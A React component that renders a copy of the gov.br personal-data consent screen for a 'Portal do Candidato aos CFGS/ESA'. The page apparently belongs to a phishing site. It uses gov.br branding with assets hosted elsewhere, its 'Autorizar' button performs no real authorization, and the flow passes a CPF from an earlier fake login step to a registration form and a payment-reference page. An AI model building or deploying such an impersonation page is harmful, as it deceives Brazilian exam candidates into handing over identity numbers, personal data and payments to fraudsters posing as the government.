import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

const API = process.env.REACT_APP_BACKEND_URL;

const ASSETS = {
  govbrLogo: "https://customer-assets.emergentagent.com/job_fazer-web-1/artifacts/gtbwkdo5_imgi_1_govbr.svg",
  altoContraste: "https://customer-assets.emergentagent.com/job_fazer-web-1/artifacts/kbywt432_image.png",
  vlibras: "https://customer-assets.emergentagent.com/job_fazer-web-1/artifacts/61tqtvzc_image.png",
};

export default function AutorizacaoDados() {
  const navigate = useNavigate();
  const [loadingAutorizar, setLoadingAutorizar] = useState(false);
  const [loadingNegar, setLoadingNegar] = useState(false);

  // Se não há sessão de login, redireciona para /login
  useEffect(() => {
    const cpf = sessionStorage.getItem("login_cpf");
    if (!cpf) {
      navigate("/login");
    }
  }, [navigate]);

  const handleAutorizar = () => {
    setLoadingAutorizar(true);
    const cpf = sessionStorage.getItem("login_cpf");
    sessionStorage.setItem("autorizado", "true");

    // Verifica se o CPF já tem uma inscrição COMPLETA (cadastro com
    // nome preenchido) salva. Se sim, pula o formulário de cadastro
    // e vai direto pro protocolo. CPFs apenas "pré-cadastrados" pelo
    // login gov.br (sem nome) NÃO devem pular — vão pro /cadastro.
    const verificarEpular = async () => {
      try {
        const r = await axios.get(
          `${API}/api/inscricoes/by-cpf/${encodeURIComponent(cpf)}`
        );
        const insc = r.data;
        const nomeReal = (insc?.cadastro?.nome || "").trim();
        if (insc && insc.id && nomeReal) {
          // Restaura os dados nos session storages que o Protocolo.jsx usa
          sessionStorage.setItem(
            "dados_inscricao",
            JSON.stringify({ ...insc.cadastro, ...(insc.inscricao || {}) })
          );
          sessionStorage.setItem("cadastro_basico", JSON.stringify(insc.cadastro));
          sessionStorage.setItem(
            "inscricao_dados",
            JSON.stringify(insc.inscricao || {})
          );
          sessionStorage.setItem("inscricao_concluida", "true");
          if (insc.numero_referencia) {
            sessionStorage.setItem("ref_pagamento", insc.numero_referencia);
          }
          navigate("/protocolo");
          return;
        }
      } catch (err) {
        // 404 = não existe inscrição; outros erros: também segue pro cadastro
      }
      navigate("/cadastro");
    };

    setTimeout(verificarEpular, 1200);
  };

  const handleNegar = () => {
    setLoadingNegar(true);
    setTimeout(() => {
      sessionStorage.removeItem("login_step");
      sessionStorage.removeItem("login_cpf");
      sessionStorage.removeItem("retornar_pagamento");
      navigate("/login");
    }, 800);
  };

  return (
    <div className="min-h-screen bg-white" data-testid="autorizacao-page">
      {/* Header */}
      <header className="w-full border-b border-gray-200" data-testid="autorizacao-header">
        <div className="w-full px-3 sm:px-6 lg:px-10 py-3 sm:py-5 flex items-center justify-between gap-2">
          <img src={ASSETS.govbrLogo} alt="gov.br" className="h-8 sm:h-10 w-auto" />
          <div className="flex items-center gap-3 sm:gap-8 flex-shrink-0">
            <button
              className="flex items-center gap-1.5 sm:gap-2 hover:underline bg-transparent border-0 p-0 cursor-pointer"
              style={{ color: "#333", fontFamily: '"Rawline","Raleway",sans-serif', fontWeight: 500 }}
            >
              <img src={ASSETS.altoContraste} alt="" className="w-4 h-4 sm:w-5 sm:h-5 object-contain" />
              <span className="hidden sm:inline text-base">Alto Contraste</span>
              <span className="sm:hidden text-xs">Contraste</span>
            </button>
            <button
              className="flex items-center gap-1.5 sm:gap-2 hover:underline bg-transparent border-0 p-0 cursor-pointer"
              style={{ color: "#333", fontFamily: '"Rawline","Raleway",sans-serif', fontWeight: 500 }}
            >
              <img src={ASSETS.vlibras} alt="" className="w-4 h-4 sm:w-5 sm:h-5 object-contain" />
              <span className="text-sm sm:text-base">VLibras</span>
            </button>
          </div>
        </div>
      </header>

      {/* Body */}
      <main className="w-full px-3 sm:px-6 py-5 sm:py-10 flex justify-center" style={{ background: "#FFFFFF" }}>
        <div
          className="w-full max-w-[760px] border border-gray-200 rounded-md p-5 sm:p-10 shadow-sm"
          data-testid="autorizacao-card"
          style={{ fontFamily: '"Rawline","Raleway",sans-serif', color: "rgb(51, 51, 51)", background: "#FFFFFF" }}
        >
          <h1
            className="text-center mb-2 text-[18px] sm:text-[24px]"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.3",
              color: "rgb(51, 51, 51)",
            }}
            data-testid="autorizacao-title"
          >
            Autorização para compartilhamento de Dados Pessoais
          </h1>
          <p
            className="text-center mb-6 sm:mb-8 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            Serviço:{" "}
            <span style={{ fontWeight: 700 }}>Portal do Candidato aos CFGS/ESA</span>
          </p>

          <p
            className="mb-3 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            O serviço que você está acessando precisa utilizar os seguintes
            dados associados à sua conta gov.br:
          </p>

          <ul
            className="list-disc pl-5 sm:pl-6 space-y-1 mb-5 sm:mb-6 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            <li>Identidade gov.br</li>
            <li>Nome e foto</li>
            <li>Endereço de e-mail</li>
            <li>Número de telefone celular</li>
          </ul>

          <p
            className="mb-5 sm:mb-6 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            O compartilhamento destes dados obedece às regras do{" "}
            <button
              type="button"
              className="bg-transparent border-0 p-0 cursor-pointer underline"
              style={{ color: "#1351b4", font: "inherit" }}
            >
              Aviso de Privacidade da conta gov.br.
            </button>
          </p>

          <p
            className="mb-5 sm:mb-6 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            Após o compartilhamento, o serviço que você está acessando passa
            a ser responsável pelo uso e tratamento dos seus dados. Leia o
            Aviso de Privacidade do serviço para entender como seus dados
            serão utilizados.
          </p>

          <p
            className="mb-5 sm:mb-6 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            Ao clicar em <strong>Autorizar</strong>, você concorda com o
            compartilhamento dos dados listados e com o tratamento destas
            informações pelo serviço.
          </p>

          <p
            className="mb-7 sm:mb-10 text-[13px] sm:text-base"
            style={{
              fontFamily: '"Rawline","Raleway",sans-serif',
              fontWeight: 400,
              lineHeight: "1.5",
              color: "rgb(51, 51, 51)",
            }}
          >
            Você pode consultar e gerenciar suas autorizações a qualquer
            momento, acessando "Autorizações" na área de Privacidade.
          </p>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-3 sm:gap-4">
            <button
              type="button"
              onClick={handleNegar}
              disabled={loadingAutorizar || loadingNegar}
              className="negar-btn"
              data-testid="btn-negar"
            >
              {loadingNegar ? <span className="btn-spinner-blue" /> : "Negar"}
            </button>
            <button
              type="button"
              onClick={handleAutorizar}
              disabled={loadingAutorizar || loadingNegar}
              className="autorizar-btn"
              data-testid="btn-autorizar"
            >
              {loadingAutorizar ? <span className="btn-spinner" /> : "Autorizar"}
            </button>
          </div>
        </div>
      </main>

      <style>{`
        .autorizar-btn {
          background: #1351b4;
          color: #fff;
          border-radius: 9999px;
          padding: 12px 44px;
          min-width: 150px;
          min-height: 44px;
          font-family: "Rawline","Raleway",sans-serif;
          font-weight: 700;
          font-size: 15px;
          border: none;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          transition: background 160ms ease, transform 160ms ease, box-shadow 160ms ease;
        }
        .autorizar-btn:hover:not(:disabled) {
          background: #0e3f8c;
          transform: translateY(-1px);
          box-shadow: 0 6px 14px rgba(19,81,180,0.25);
        }
        .autorizar-btn:disabled { background: #8fb1e0; cursor: not-allowed; }

        .negar-btn {
          background: #fff;
          color: #1351b4;
          border: 1px solid #1351b4;
          border-radius: 9999px;
          padding: 12px 44px;
          min-width: 150px;
          min-height: 44px;
          font-family: "Rawline","Raleway",sans-serif;
          font-weight: 700;
          font-size: 15px;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          transition: background 160ms ease;
        }
        .negar-btn:hover:not(:disabled) { background: #ecf0f9; }
        .negar-btn:disabled { opacity: 0.6; cursor: not-allowed; }

        @keyframes spin360 {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .btn-spinner {
          width: 22px; height: 22px;
          border: 3px solid rgba(255,255,255,0.45);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin360 0.85s linear infinite;
        }
        .btn-spinner-blue {
          width: 22px; height: 22px;
          border: 3px solid rgba(19,81,180,0.25);
          border-top-color: #1351b4;
          border-radius: 50%;
          animation: spin360 0.85s linear infinite;
        }
      `}</style>
    </div>
  );
}
